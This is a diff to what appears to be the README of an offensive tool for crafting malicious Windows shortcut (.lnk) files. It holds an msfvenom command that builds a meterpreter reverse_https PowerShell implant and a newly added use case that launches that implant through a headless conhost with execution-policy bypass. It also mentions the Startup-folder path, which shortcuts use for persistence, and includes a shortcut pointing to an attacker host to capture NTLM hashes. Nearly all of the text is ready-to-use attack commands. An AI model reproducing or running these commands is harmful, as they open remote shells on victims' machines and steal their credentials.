@@ -23,7 +23,7 @@ C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartU
 Note: The **TargetPath** has a limit of 260 characters long. If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`.
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > shell.ps1
+$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > implant.ps1
 ```
 
 TODO: Remove timestamps in the .lnk file
@@ -80,7 +80,11 @@ $ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\cmd.exe" "
 
 ## 03 - Use Cases
 
-### 3.1 - Capture NTLM Relay
+```
+$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell -ep bypass -f implant.ps1" shortcut_file.lnk
+```
+
+### 3.2 - Capture NTLM Relay
 
 ```
 $ wine wscript '//Nologo' '//B' generate_lnk.vbs "file://<attacker_IP>/@snare" "" file.lnk
